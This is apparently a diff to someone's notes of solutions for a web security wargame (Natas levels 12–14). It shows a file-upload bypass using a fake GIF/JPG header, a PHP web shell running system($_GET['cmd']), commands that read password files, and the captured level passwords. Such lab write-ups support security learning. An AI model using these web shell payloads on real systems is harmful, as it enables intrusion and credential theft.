@@ -39,8 +39,16 @@ N12 --> Upload ay jpg file. Intercept upload and change jpg to php and add
 --- <? php echo passthrough (' cat /etc/natas_webpass/natas13 '); ?>
   N13 --> trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
-N13 --> 
-  N14 -->
+N13 --> Create a jpg file with GIF89a <?php system($_GET['cmd']); ?>, Intercept and change jpg to php.
+--- add cmd = /etc/natas_webpass/natas14 in url
+  N14 --> z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+N14 --> 
+  N15 -->
+
+
+
+
 
 
 
